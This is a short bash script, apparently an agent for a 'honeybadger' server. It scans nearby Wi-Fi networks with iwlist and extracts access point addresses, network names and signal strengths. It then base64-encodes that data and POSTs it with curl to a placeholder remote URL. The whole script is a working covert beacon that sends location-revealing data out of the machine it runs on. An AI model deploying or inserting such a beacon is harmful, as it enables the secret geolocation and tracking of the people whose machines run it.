#!/bin/bash

honeybadger_url="placeholder.placeholder.placeholder"
target="target.placeholder"


agent="linuxbash"
os="linux"
data=$(iwlist scan | egrep 'Address|ESSID|Signal' | base64)

curl -i \
-X POST --data "agent=$agent&os=$os&target=$target&data=$data" $honeybadger_url
